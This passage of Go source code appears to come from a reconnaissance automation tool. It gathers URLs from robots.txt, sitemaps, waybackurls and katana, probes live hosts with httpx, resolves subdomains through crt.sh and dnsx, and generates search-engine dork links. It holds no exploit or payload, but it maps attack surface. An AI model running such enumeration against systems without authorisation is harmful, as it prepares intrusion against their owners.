		robotsPath := filepath.Join(a.cfg.Paths.RobotsDir, fmt.Sprintf("%s.robots.txt", clean))
		urlsPath := filepath.Join(a.cfg.Paths.RobotsDir, fmt.Sprintf("%s.robots.urls", clean))

		req, err := http.NewRequestWithContext(ctx, "GET", robotsURL, nil)
		if err != nil {
			return err
		}

		resp, err := a.httpClient.Do(req)
		if err != nil {
			continue
		}

		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		if err := os.WriteFile(robotsPath, body, 0o644); err != nil {
			return err
		}

		disallows := extractDisallows(string(body))
		sitemapURLs := extractSitemaps(string(body))

		var endpointSet = make(map[string]struct{})
		var robotsURLSet = make(map[string]struct{})
		for _, disallow := range disallows {
			disallow = strings.TrimSpace(disallow)
			if disallow == "" {
				continue
			}
			u := normalizeFFUFHitURL(baseURL + "/" + strings.TrimPrefix(disallow, "/"))
			if u != "" {
				endpointSet[u] = struct{}{}
				robotsURLSet[u] = struct{}{}
			}
		}

		for _, sitemapURL := range sitemapURLs {
			sitemapURL = strings.TrimSpace(sitemapURL)
			if sitemapURL == "" {
				continue
			}
			if err := appendToFile(a.cfg.Paths.SitemapsFile, sitemapURL+"\n"); err != nil {
				return err
			}
			locs, fetchErr := a.fetchSitemapLocs(ctx, sitemapURL)
			if fetchErr != nil {
				continue
			}
			for _, loc := range locs {
				endpointSet[loc] = struct{}{}
			}
		}

		var endpoints []string
		for endpoint := range endpointSet {
			endpoints = append(endpoints, endpoint)
		}
		sort.Strings(endpoints)
		if len(endpoints) == 0 {
			if err := moveRobotFiles(robotsPath, urlsPath, noHitsDir); err != nil {
				return err
			}
			continue
		}

		if err := os.WriteFile(urlsPath, []byte(strings.Join(endpoints, "\n")), 0o644); err != nil {
			return err
		}

		if err := moveRobotFiles(robotsPath, urlsPath, hitsDir); err != nil {
			return err
		}

		if err := appendToFile(hitsFile, strings.Join(endpoints, "\n")+"\n"); err != nil {
			return err
		}
		if len(robotsURLSet) > 0 {
			var robotsURLs []string
			for u := range robotsURLSet {
				robotsURLs = append(robotsURLs, u)
			}
			sort.Strings(robotsURLs)
			if err := appendToFile(robotsURLsFile, strings.Join(robotsURLs, "\n")+"\n"); err != nil {
				return err
			}
		}
	}

	if err := dedupeAndSortFile(hitsFile); err != nil {
		return err
	}
	if err := dedupeAndSortFile(robotsURLsFile); err != nil {
		return err
	}
	return dedupeAndSortFile(a.cfg.Paths.SitemapsFile)
}

func (a *App) runWaybackURLs(ctx context.Context, source string) error {
	if source == "" || !fileExists(source) {
		return nil
	}
	reconDir := filepath.Join(filepath.Dir(a.cfg.Lists.Domains), "recon")
	rawDir := filepath.Join(reconDir, "raw", StepWaybackURLs)
	if err := os.MkdirAll(rawDir, 0o755); err != nil {
		return err
	}

	outFile := filepath.Join(reconDir, "waybackurls_urls.txt")
	if err := os.WriteFile(outFile, []byte{}, 0o644); err != nil {
		return err
	}

	inputs := readSafeLines(source)
	hostsSet := make(map[string]struct{})
	for _, in := range inputs {
		host := normalizeDorkTarget(in)
		if host == "" {
			continue
		}
		hostsSet[host] = struct{}{}
	}
	var hosts []string
	for host := range hostsSet {
		hosts = append(hosts, host)
	}
	sort.Strings(hosts)

	urlSet := make(map[string]struct{})
	for _, host := range hosts {
		stdout, err := a.runCommandCaptureWithInput(ctx, host+"\n", "waybackurls")
		if err != nil {
			a.logger.Printf("%s: failed host=%s: %v", StepWaybackURLs, host, err)
			continue
		}
		rawPath := filepath.Join(rawDir, fmt.Sprintf("%s.txt", sanitizeFilename(host)))
		if writeErr := os.WriteFile(rawPath, []byte(stdout), 0o644); writeErr != nil {
			a.logger.Printf("%s: failed to persist raw output for %s: %v", StepWaybackURLs, host, writeErr)
		}
		for _, line := range strings.Split(stdout, "\n") {
			u := normalizeFFUFHitURL(line)
			if u == "" {
				continue
			}
			urlSet[u] = struct{}{}
		}
	}

	var urls []string
	for u := range urlSet {
		urls = append(urls, u)
	}
	sort.Strings(urls)
	if err := os.WriteFile(outFile, []byte(strings.Join(urls, "\n")), 0o644); err != nil {
		return err
	}
	a.logger.Printf("%s: total urls=%d (%s)", StepWaybackURLs, len(urls), outFile)
	return nil
}

func (a *App) runKatana(ctx context.Context, source string) error {
	if source == "" || !fileExists(source) {
		return nil
	}
	reconDir := filepath.Join(filepath.Dir(a.cfg.Lists.Domains), "recon")
	rawDir := filepath.Join(reconDir, "raw", StepKatana)
	if err := os.MkdirAll(rawDir, 0o755); err != nil {
		return err
	}

	outFile := filepath.Join(reconDir, "katana_urls.txt")
	if err := os.WriteFile(outFile, []byte{}, 0o644); err != nil {
		return err
	}

	targets := readSafeLines(source)
	urlSet := make(map[string]struct{})
	for _, target := range targets {
		target = strings.TrimSpace(target)
		if normalizeFFUFHitURL(target) == "" {
			continue
		}
		stdout, err := a.runCommandCapture(ctx, "katana", "-silent", "-u", target)
		if err != nil {
			a.logger.Printf("%s: failed target=%s: %v", StepKatana, target, err)
			continue
		}
		rawPath := filepath.Join(rawDir, fmt.Sprintf("%s.txt", sanitizeFilename(target)))
		if writeErr := os.WriteFile(rawPath, []byte(stdout), 0o644); writeErr != nil {
			a.logger.Printf("%s: failed to persist raw output for %s: %v", StepKatana, target, writeErr)
		}
		for _, line := range strings.Split(stdout, "\n") {
			u := normalizeFFUFHitURL(line)
			if u == "" {
				continue
			}
			urlSet[u] = struct{}{}
		}
	}

	var urls []string
	for u := range urlSet {
		urls = append(urls, u)
	}
	sort.Strings(urls)
	if err := os.WriteFile(outFile, []byte(strings.Join(urls, "\n")), 0o644); err != nil {
		return err
	}
	a.logger.Printf("%s: total urls=%d (%s)", StepKatana, len(urls), outFile)
	return nil
}

func (a *App) consolidateURLCorpus() error {
	reconDir := filepath.Join(filepath.Dir(a.cfg.Lists.Domains), "recon")
	allURLs := filepath.Join(reconDir, "all_urls.txt")
	if err := os.MkdirAll(reconDir, 0o755); err != nil {
		return err
	}

	paths := []string{
		filepath.Join(a.cfg.Paths.RobotsDir, "_hits.txt"),
		filepath.Join(a.cfg.Paths.RobotsDir, "robots_urls.txt"),
		filepath.Join(reconDir, "waybackurls_urls.txt"),
		filepath.Join(reconDir, "katana_urls.txt"),
		a.httpListOrDefault(a.cfg.Lists.Domains),
	}

	set := make(map[string]struct{})
	for _, p := range paths {
		for _, line := range readSafeLines(p) {
			u := normalizeFFUFHitURL(strings.TrimSpace(line))
			if u == "" {
				continue
			}
			set[u] = struct{}{}
		}
	}

	var urls []string
	for u := range set {
		urls = append(urls, u)
	}
	sort.Strings(urls)
	if err := os.WriteFile(allURLs, []byte(strings.Join(urls, "\n")), 0o644); err != nil {
		return err
	}
	a.logger.Printf("%s: total urls=%d (%s)", StepURLCorpus, len(urls), allURLs)
	return nil
}

func (a *App) generateDorkLinksIfNeeded(ctx context.Context) error {
	if a.hasExistingDorkLinks() {
		a.logger.Printf("%s: skipped (existing dork links found in %s)", StepDorkLinks, a.cfg.Paths.DorkingDir)
		return nil
	}
	if err := os.MkdirAll(a.cfg.Paths.DorkingDir, 0o755); err != nil {
		return err
	}

	run := func(cmd string) error {
		return a.runShell(ctx, fmt.Sprintf("cd %s && %s", shellQuote(a.cfg.Paths.DorkingDir), cmd))
	}
	if fileExists(a.cfg.Lists.Organizations) && len(readSafeLines(a.cfg.Lists.Organizations)) > 0 {
		orgPath, err := toAbsPath(a.cfg.Lists.Organizations)
		if err != nil {
			return err
		}
		if err := run(fmt.Sprintf("generate_dork_links -oR %s --api", shellQuote(orgPath))); err != nil {
			return err
		}
	}

	for _, path := range []string{a.cfg.Lists.Wildcards, a.cfg.Lists.Domains, a.cfg.Lists.APIDomains} {
		if !fileExists(path) || len(readSafeLines(path)) == 0 {
			continue
		}
		absPath, err := toAbsPath(path)
		if err != nil {
			return err
		}
		if err := run(fmt.Sprintf("generate_dork_links -L %s --api", shellQuote(absPath))); err != nil {
			return err
		}
	}

	moveCmd := strings.Join([]string{
		fmt.Sprintf("mkdir -p %s %s %s %s", shellQuote(filepath.Join(a.cfg.Paths.DorkingDir, "shodan")), shellQuote(filepath.Join(a.cfg.Paths.DorkingDir, "github")), shellQuote(filepath.Join(a.cfg.Paths.DorkingDir, "google")), shellQuote(filepath.Join(a.cfg.Paths.DorkingDir, "wayback"))),
		fmt.Sprintf("find %s -maxdepth 1 -type f -name '*shodan*' -exec mv {} %s/ \\;", shellQuote(a.cfg.Paths.DorkingDir), shellQuote(filepath.Join(a.cfg.Paths.DorkingDir, "shodan"))),
		fmt.Sprintf("find %s -maxdepth 1 -type f -name '*github*' -exec mv {} %s/ \\;", shellQuote(a.cfg.Paths.DorkingDir), shellQuote(filepath.Join(a.cfg.Paths.DorkingDir, "github"))),
		fmt.Sprintf("find %s -maxdepth 1 -type f -name '*google*' -exec mv {} %s/ \\;", shellQuote(a.cfg.Paths.DorkingDir), shellQuote(filepath.Join(a.cfg.Paths.DorkingDir, "google"))),
		fmt.Sprintf("find %s -maxdepth 1 -type f -name '*wayback*' -exec mv {} %s/ \\;", shellQuote(a.cfg.Paths.DorkingDir), shellQuote(filepath.Join(a.cfg.Paths.DorkingDir, "wayback"))),
	}, " && ")
	if err := a.runShell(ctx, moveCmd); err != nil {
		return err
	}
	return nil
}

func (a *App) hasExistingDorkLinks() bool {
	entries, err := os.ReadDir(a.cfg.Paths.DorkingDir)
	if err != nil {
		return false
	}
	for _, entry := range entries {
		if entry.IsDir() {
			sub, subErr := os.ReadDir(filepath.Join(a.cfg.Paths.DorkingDir, entry.Name()))
			if subErr != nil {
				continue
			}
			for _, f := range sub {
				if f.IsDir() {
					continue
				}
				name := strings.ToLower(strings.TrimSpace(f.Name()))
				if strings.Contains(name, "dork") && strings.HasSuffix(name, ".txt") {
					return true
				}
			}
			continue
		}
		name := strings.ToLower(strings.TrimSpace(entry.Name()))
		if strings.Contains(name, "dork") && strings.HasSuffix(name, ".txt") {
			return true
		}
	}
	return false
}

func shellQuote(value string) string {
	return "'" + strings.ReplaceAll(value, "'", "'\"'\"'") + "'"
}

func toAbsPath(path string) (string, error) {
	if filepath.IsAbs(path) {
		return path, nil
	}
	return filepath.Abs(path)
}

func (a *App) buildHTTPDomains(ctx context.Context) (string, error) {
	if !fileExists(a.cfg.Lists.Domains) {
		return "", nil
	}

	csvPath := filepath.Join(filepath.Dir(a.cfg.Lists.Domains), "live-webservers.csv")
	legacyDomainsHTTP := filepath.Join(filepath.Dir(a.cfg.Lists.Domains), "domains_http")
	if removeErr := os.Remove(legacyDomainsHTTP); removeErr != nil && !errors.Is(removeErr, os.ErrNotExist) {
		a.logger.Printf("%s: failed to remove legacy %s: %v", StepHTTPX, legacyDomainsHTTP, removeErr)
	}

	stdout, err := a.runCommandCapture(
		ctx,
		"httpx",
		"-silent",
		"-json",
		"-status-code",
		"-title",
		"-web-server",
		"-tech-detect",
		"-content-length",
		"-l",
		a.cfg.Lists.Domains,
	)
	if err != nil {
		tmpOutput, mkErr := os.CreateTemp("", "bflow-httprobe-live-")
		if mkErr != nil {
			return "", mkErr
		}
		tmpOutputPath := tmpOutput.Name()
		_ = tmpOutput.Close()
		defer os.Remove(tmpOutputPath)

		httprobeCmd := fmt.Sprintf("cat %s | awk '{print $1}' | httprobe -prefer-https | sort -u > %s", shellQuote(a.cfg.Lists.Domains), shellQuote(tmpOutputPath))
		if fallbackErr := a.runShell(ctx, httprobeCmd); fallbackErr != nil {
			return "", fmt.Errorf("http probing failed: httpx=%v; httprobe=%v", err, fallbackErr)
		}

		urls := readSafeLines(tmpOutputPath)
		if err := os.WriteFile(a.cfg.Lists.Domains, []byte(strings.Join(urls, "\n")), 0o644); err != nil {
			return "", err
		}
		if err := a.generateAPIDomainsFromDomains(); err != nil {
			return "", err
		}

		var fallbackRows []liveWebserverRecord
		for _, u := range urls {
			u = normalizeLiveTarget(u)
			if u == "" {
				continue
			}
			fallbackRows = append(fallbackRows, liveWebserverRecord{URL: u})
		}
		if err := a.writeLiveWebserversCSV(csvPath, fallbackRows); err != nil {
			return "", err
		}
		a.liveCSVPath = csvPath
		return a.cfg.Lists.Domains, nil
	}

	rows := parseHTTPXJSONRecords(stdout)
	urlSet := make(map[string]struct{}, len(rows))
	for _, row := range rows {
		u := normalizeLiveTarget(row.URL)
		if u == "" {
			continue
		}
		urlSet[u] = struct{}{}
	}
	var urls []string
	for u := range urlSet {
		urls = append(urls, u)
	}
	sort.Strings(urls)
	if err := os.WriteFile(a.cfg.Lists.Domains, []byte(strings.Join(urls, "\n")), 0o644); err != nil {
		return "", err
	}
	if err := a.generateAPIDomainsFromDomains(); err != nil {
		return "", err
	}
	if err := a.writeLiveWebserversCSV(csvPath, rows); err != nil {
		return "", err
	}

	a.liveCSVPath = csvPath
	return a.cfg.Lists.Domains, nil
}

func parseHTTPXJSONRecords(output string) []liveWebserverRecord {
	var out []liveWebserverRecord
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		var raw map[string]any
		if err := json.Unmarshal([]byte(line), &raw); err != nil {
			continue
		}

		rec := liveWebserverRecord{
			URL:           asString(raw["url"]),
			StatusCode:    asInt(raw["status_code"]),
			Title:         asString(raw["title"]),
			WebServer:     asString(raw["webserver"]),
			ContentLength: asInt(raw["content_length"]),
		}

		if techs := asStringSlice(raw["tech"]); len(techs) > 0 {
			rec.Technologies = techs
		} else {
			rec.Technologies = asStringSlice(raw["technologies"])
		}
		if rec.URL == "" {
			continue
		}
		out = append(out, rec)
	}

	sort.Slice(out, func(i, j int) bool {
		return strings.ToLower(out[i].URL) < strings.ToLower(out[j].URL)
	})
	return out
}

func toJSONLines(raw []byte) []string {
	trimmed := strings.TrimSpace(string(raw))
	if trimmed == "" {
		return nil
	}
	var data any
	if err := json.Unmarshal([]byte(trimmed), &data); err != nil {
		return nil
	}
	var lines []string
	switch typed := data.(type) {
	case map[string]any:
		b, err := json.Marshal(typed)
		if err == nil {
			lines = append(lines, string(b))
		}
	case []any:
		for _, item := range typed {
			m, ok := item.(map[string]any)
			if !ok {
				continue
			}
			b, err := json.Marshal(m)
			if err == nil {
				lines = append(lines, string(b))
			}
		}
	}
	return lines
}

func (a *App) generateAPIDomainsFromDomains() error {
	lines := readSafeLines(a.cfg.Lists.Domains)
	apiSet := make(map[string]struct{})
	for _, line := range lines {
		host := extractHostCandidate(line)
		if host == "" {
			continue
		}
		if isAPIRelatedHost(host) {
			apiSet[normalizeLiveTarget(line)] = struct{}{}
		}
	}

	apiDomains := make([]string, 0, len(apiSet))
	for target := range apiSet {
		if target == "" {
			continue
		}
		apiDomains = append(apiDomains, target)
	}
	sort.Strings(apiDomains)
	return os.WriteFile(a.cfg.Lists.APIDomains, []byte(strings.Join(apiDomains, "\n")), 0o644)
}

func extractHostCandidate(raw string) string {
	value := strings.TrimSpace(strings.ToLower(raw))
	if value == "" {
		return ""
	}

	if strings.Contains(value, "://") {
		parsed, err := url.Parse(value)
		if err == nil {
			return strings.TrimSpace(strings.Trim(parsed.Hostname(), "."))
		}
	}

	value = strings.SplitN(value, "/", 2)[0]
	if host, _, err := net.SplitHostPort(value); err == nil {
		value = host
	} else if strings.Count(value, ":") == 1 {
		parts := strings.SplitN(value, ":", 2)
		if _, convErr := strconv.Atoi(parts[1]); convErr == nil {
			value = parts[0]
		}
	}

	return strings.TrimSpace(strings.Trim(value, "."))
}

func isAPIRelatedHost(host string) bool {
	labels := strings.Split(strings.ToLower(strings.TrimSpace(host)), ".")
	for _, label := range labels {
		if label == "" {
			continue
		}
		if label == "api" ||
			strings.HasPrefix(label, "api-") ||
			strings.HasSuffix(label, "-api") ||
			strings.HasPrefix(label, "api") ||
			strings.HasSuffix(label, "api") ||
			strings.Contains(label, "graphql") ||
			strings.Contains(label, "gateway") {
			return true
		}
	}
	return false
}

func (a *App) writeLiveWebserversCSV(path string, rows []liveWebserverRecord) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()

	w := csv.NewWriter(f)
	defer w.Flush()

	if err := w.Write([]string{"url", "status_code", "title", "web_server", "technologies", "content_length"}); err != nil {
		return err
	}
	for _, row := range rows {
		if err := w.Write([]string{
			row.URL,
			strconv.Itoa(row.StatusCode),
			row.Title,
			row.WebServer,
			strings.Join(row.Technologies, "; "),
			strconv.Itoa(row.ContentLength),
		}); err != nil {
			return err
		}
	}
	return w.Error()
}

func asString(v any) string {
	switch x := v.(type) {
	case string:
		return strings.TrimSpace(x)
	case float64:
		return strconv.FormatFloat(x, 'f', -1, 64)
	case int:
		return strconv.Itoa(x)
	default:
		return ""
	}
}

func asInt(v any) int {
	switch x := v.(type) {
	case float64:
		return int(x)
	case int:
		return x
	case string:
		n, _ := strconv.Atoi(strings.TrimSpace(x))
		return n
	default:
		return 0
	}
}

func asStringSlice(v any) []string {
	switch x := v.(type) {
	case []any:
		var out []string
		for _, item := range x {
			s := asString(item)
			if s != "" {
				out = append(out, s)
			}
		}
		return out
	case []string:
		var out []string
		for _, s := range x {
			s = strings.TrimSpace(s)
			if s != "" {
				out = append(out, s)
			}
		}
		return out
	default:
		return nil
	}
}

func (a *App) httpListOrDefault(path string) string {
	return path
}

func normalizeLiveTarget(raw string) string {
	value := strings.TrimSpace(strings.TrimRight(raw, "/"))
	if value == "" {
		return ""
	}

	if strings.Contains(value, "://") {
		parsed, err := url.Parse(value)
		if err == nil {
			scheme := strings.ToLower(strings.TrimSpace(parsed.Scheme))
			if scheme != "http" && scheme != "https" {
				return ""
			}
			host := strings.TrimSpace(strings.ToLower(strings.Trim(parsed.Hostname(), ".")))
			if host == "" {
				return ""
			}
			if port := strings.TrimSpace(parsed.Port()); port != "" {
				return fmt.Sprintf("%s://%s:%s", scheme, host, port)
			}
			return fmt.Sprintf("%s://%s", scheme, host)
		}
	}

	host := extractHostCandidate(value)
	if host == "" {
		return ""
	}
	return host
}

func normalizeDorkTarget(value string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		return ""
	}

	value = strings.TrimPrefix(value, "http://")
	value = strings.TrimPrefix(value, "https://")
	value = strings.TrimPrefix(value, "www.")

	if idx := strings.Index(value, "/"); idx != -1 {
		value = value[:idx]
	}

	value = strings.TrimPrefix(value, "*.")
	value = strings.TrimSpace(value)
	return value
}

func normalizeSubdomainSeed(value string) string {
	value = normalizeDorkTarget(value)
	if value == "" {
		return ""
	}

	parts := strings.Split(value, ".")
	clean := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		if strings.Contains(p, "*") {
			continue
		}
		clean = append(clean, p)
	}

	if len(clean) < 2 {
		return ""
	}

	return strings.Join(clean, ".")
}

func (a *App) runShell(ctx context.Context, script string) error {
	start := time.Now()
	a.logger.Printf("exec shell: %s", script)
	cmd := exec.CommandContext(ctx, "sh", "-c", script)
	cmd.Stdout = a.commandOutput()
	cmd.Stderr = a.commandOutput()
	if err := cmd.Run(); err != nil {
		a.logger.Printf("exec shell failed after %s: %v", time.Since(start).Round(time.Second), err)
		return err
	}
	a.logger.Printf("exec shell done in %s", time.Since(start).Round(time.Second))
	return nil
}

func (a *App) runCommandCapture(ctx context.Context, name string, args ...string) (string, error) {
	start := time.Now()
	a.logger.Printf("exec: %s %s", name, strings.Join(args, " "))
	cmd := exec.CommandContext(ctx, name, args...)
	var stdout strings.Builder
	cmd.Stdout = io.MultiWriter(&stdout, a.commandOutput())
	cmd.Stderr = a.commandOutput()
	if err := cmd.Run(); err != nil {
		a.logger.Printf("exec failed: %s (%s): %v", name, time.Since(start).Round(time.Second), err)
		return "", err
	}
	a.logger.Printf("exec done: %s (%s)", name, time.Since(start).Round(time.Second))
	return stdout.String(), nil
}

func (a *App) runCommandCaptureWithInput(ctx context.Context, input string, name string, args ...string) (string, error) {
	start := time.Now()
	a.logger.Printf("exec: %s %s", name, strings.Join(args, " "))
	cmd := exec.CommandContext(ctx, name, args...)
	cmd.Stdin = strings.NewReader(input)
	var stdout strings.Builder
	cmd.Stdout = io.MultiWriter(&stdout, a.commandOutput())
	cmd.Stderr = a.commandOutput()
	if err := cmd.Run(); err != nil {
		a.logger.Printf("exec failed: %s (%s): %v", name, time.Since(start).Round(time.Second), err)
		return "", err
	}
	a.logger.Printf("exec done: %s (%s)", name, time.Since(start).Round(time.Second))
	return stdout.String(), nil
}

func (a *App) runForSeedWithRetry(
	ctx context.Context,
	step string,
	seed string,
	attempts int,
	backoff time.Duration,
	fn func() ([]string, error),
) ([]string, error) {
	if attempts < 1 {
		attempts = 1
	}
	if backoff <= 0 {
		backoff = time.Second
	}

	var lastErr error
	for attempt := 1; attempt <= attempts; attempt++ {
		hosts, err := fn()
		if err == nil {
			return hosts, nil
		}
		lastErr = err
		if attempt >= attempts {
			break
		}
		if ctx.Err() != nil {
			return nil, ctx.Err()
		}

		wait := backoff * time.Duration(1<<(attempt-1))
		a.logger.Printf("%s: retry seed=%s attempt=%d/%d after error: %v", step, seed, attempt+1, attempts, err)
		timer := time.NewTimer(wait)
		select {
		case <-ctx.Done():
			timer.Stop()
			return nil, ctx.Err()
		case <-timer.C:
		}
	}

	return nil, lastErr
}

func parseDomainLines(output, seed string) []string {
	hostPattern := regexp.MustCompile(`[a-zA-Z0-9][a-zA-Z0-9._-]*\.` + regexp.QuoteMeta(seed))
	set := make(map[string]struct{})
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		matches := hostPattern.FindAllString(line, -1)
		for _, match := range matches {
			match = normalizeDorkTarget(match)
			if match == "" {
				continue
			}
			set[match] = struct{}{}
		}
	}
	var out []string
	for host := range set {
		out = append(out, host)
	}
	sort.Strings(out)
	return out
}

func parseHostsFromURLs(output, seed string) []string {
	set := make(map[string]struct{})
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		u, err := url.Parse(line)
		if err != nil {
			continue
		}
		host := strings.ToLower(strings.TrimSpace(u.Hostname()))
		if host == "" || !strings.HasSuffix(host, seed) {
			continue
		}
		set[host] = struct{}{}
	}
	var out []string
	for host := range set {
		out = append(out, host)
	}
	sort.Strings(out)
	return out
}

func (a *App) fetchCTLHosts(ctx context.Context, seed string) ([]string, error) {
	hosts, _, err := a.fetchCTLHostsRaw(ctx, seed)
	return hosts, err
}

func (a *App) fetchCTLHostsRaw(ctx context.Context, seed string) ([]string, []byte, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, fmt.Sprintf("https://crt.sh/?q=%%25.%s&output=json", seed), nil)
	if err != nil {
		return nil, nil, err
	}
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return nil, nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		return nil, nil, fmt.Errorf("crt.sh returned status %d", resp.StatusCode)
	}

	rawBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, nil, err
	}
	hosts, err := parseCTLHostsFromBody(rawBody, seed)
	if err != nil {
		return nil, nil, err
	}
	return hosts, rawBody, nil
}

func parseCTLHostsFromBody(body []byte, seed string) ([]string, error) {
	var rows []struct {
		NameValue string `json:"name_value"`
	}
	if err := json.Unmarshal(body, &rows); err != nil {
		return nil, err
	}

	set := make(map[string]struct{})
	for _, row := range rows {
		for _, raw := range strings.Split(row.NameValue, "\n") {
			raw = strings.TrimSpace(strings.TrimPrefix(raw, "*."))
			host := normalizeDorkTarget(raw)
			if host == "" || !strings.HasSuffix(host, seed) {
				continue
			}
			set[host] = struct{}{}
		}
	}

	var out []string
	for host := range set {
		out = append(out, host)
	}
	sort.Strings(out)
	return out, nil
}

func (a *App) validateHostsWithDNSX(ctx context.Context, hosts []string, outDir string) ([]string, []string, error) {
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return nil, nil, err
	}
	inFile := filepath.Join(outDir, "input_hosts.txt")
	rawOutFile := filepath.Join(outDir, "results.txt")
	outFile := filepath.Join(outDir, "validated_hosts.txt")
	if err := os.WriteFile(inFile, []byte(strings.Join(hosts, "\n")), 0o644); err != nil {
		return nil, nil, err
	}
	stdout, err := a.runCommandCapture(ctx, "dnsx", "-silent", "-a", "-resp", "-l", inFile)
	if err != nil {
		return nil, nil, err
	}
	if writeErr := os.WriteFile(rawOutFile, []byte(stdout), 0o644); writeErr != nil {
		a.logger.Printf("%s: failed to persist dnsx raw output: %v", StepDNSX, writeErr)
	}
	hostIPs := parseDNSXHostIPs(stdout)
	var validated []string
	ipSet := make(map[string]struct{})
	for host, ips := range hostIPs {
		validated = append(validated, host)
		for _, ip := range ips {
			if ip != "" {
				ipSet[ip] = struct{}{}
			}
		}
	}
	if len(validated) == 0 {
		validated = unique(readSafeLines(outFile))
	}
	if writeErr := os.WriteFile(outFile, []byte(strings.Join(unique(validated), "\n")), 0o644); writeErr != nil {
		a.logger.Printf("%s: failed to persist dnsx validated hosts: %v", StepDNSX, writeErr)
	}
	var discoveredIPs []string
	for ip := range ipSet {
		discoveredIPs = append(discoveredIPs, ip)
	}
	sort.Strings(discoveredIPs)
	if writeErr := os.WriteFile(filepath.Join(outDir, "discovered_ips.txt"), []byte(strings.Join(discoveredIPs, "\n")), 0o644); writeErr != nil {
		a.logger.Printf("%s: failed to persist discovered ips: %v", StepDNSX, writeErr)
	}
	validated = unique(validated)
	sort.Strings(validated)
	return validated, discoveredIPs, nil
}

func parseDNSXHostIPs(output string) map[string][]string {
	records := make(map[string]map[string]struct{})
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) == 0 {
			continue
		}
		host := normalizeDorkTarget(fields[0])
		if host == "" {
			continue
		}
		if _, ok := records[host]; !ok {
			records[host] = make(map[string]struct{})
		}
		for _, token := range fields[1:] {
			clean := strings.Trim(token, "[],;()")
			if ip := net.ParseIP(clean); ip != nil {
				records[host][ip.String()] = struct{}{}
			}
		}
	}

	out := make(map[string][]string, len(records))
	for host, set := range records {
		var ips []string
		for ip := range set {
			ips = append(ips, ip)
		}
		sort.Strings(ips)
		out[host] = ips
	}
	return out
}

func (a *App) mergeDiscoveredIPs(ips []string) error {
	if len(ips) == 0 {
		return nil
	}
	existing := readSafeLines(a.cfg.Lists.IPs)
	merged := unique(append(existing, ips...))
	return os.WriteFile(a.cfg.Lists.IPs, []byte(strings.Join(merged, "\n")), 0o644)
}

func (a *App) commandOutput() io.Writer {
	if a.logWriter == nil {
		return os.Stdout
	}
	return io.MultiWriter(os.Stdout, a.logWriter)
}

func readFileLines(path string) ([]string, error) {
	if path == "" {
		return nil, errors.New("empty path")
	}

	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		lines = append(lines, line)
	}
	return lines, scanner.Err()
}

func readSafeLines(path string) []string {
	lines, _ := readFileLines(path)
	return lines
}

func unique(values []string) []string {
	set := make(map[string]struct{}, len(values))
	for _, v := range values {
		if v == "" {
			continue
		}
		set[v] = struct{}{}
	}

	result := make([]string, 0, len(set))
	for k := range set {
		result = append(result, k)
	}

	sort.Strings(result)
	return result
}

func sanitizeFilename(input string) string {
	s := strings.TrimSpace(input)
	s = strings.TrimPrefix(s, "http://")
	s = strings.TrimPrefix(s, "https://")
	s = strings.TrimPrefix(s, "www.")
	s = strings.ReplaceAll(s, "/", "_")
	s = strings.ReplaceAll(s, ":", "_")
	return strings.ReplaceAll(s, " ", "_")
}

func extractDisallows(body string) []string {
	var result []string
	for _, line := range strings.Split(body, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Disallow:") {
			result = append(result, strings.TrimSpace(strings.TrimPrefix(line, "Disallow:")))
		}
	}
	return result
}

func extractSitemaps(body string) []string {
	set := make(map[string]struct{})
	for _, line := range strings.Split(body, "\n") {
		trimmed := strings.TrimSpace(line)
		if !strings.HasPrefix(strings.ToLower(trimmed), "sitemap:") {
			continue
		}
		parts := strings.SplitN(trimmed, ":", 2)
		if len(parts) < 2 {
			continue
		}
		u := strings.TrimSpace(parts[1])
		if normalizeFFUFHitURL(u) == "" {
			continue
		}
		set[u] = struct{}{}
	}
	var out []string
	for u := range set {
		out = append(out, u)
	}
	sort.Strings(out)
	return out
}

func extractSitemapLocs(body string) []string {
	pattern := regexp.MustCompile(`(?is)<loc>\s*([^<\s]+)\s*</loc>`)
	matches := pattern.FindAllStringSubmatch(body, -1)
	set := make(map[string]struct{})
	for _, m := range matches {
		if len(m) < 2 {
			continue
		}
		u := normalizeFFUFHitURL(strings.TrimSpace(m[1]))
		if u == "" {
			continue
		}
		set[u] = struct{}{}
	}
	var out []string
	for u := range set {
		out = append(out, u)
	}
	sort.Strings(out)
	return out
}

func (a *App) fetchSitemapLocs(ctx context.Context, sitemapURL string) ([]string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, sitemapURL, nil)
	if err != nil {
		return nil, err
	}
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("sitemap returned status %d", resp.StatusCode)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	return extractSitemapLocs(string(body)), nil
}

func moveRobotFiles(robotsPath, urlsPath, targetDir string) error {
	if targetDir == "" {
		return errors.New("empty target directory")
	}
	if err := os.MkdirAll(targetDir, 0o755); err != nil {
		return err
	}
	if err := moveIfExists(robotsPath, filepath.Join(targetDir, filepath.Base(robotsPath))); err != nil {
		return err
	}
	if err := moveIfExists(urlsPath, filepath.Join(targetDir, filepath.Base(urlsPath))); err != nil {
		return err
	}
	return nil
}

func moveIfExists(src, dst string) error {
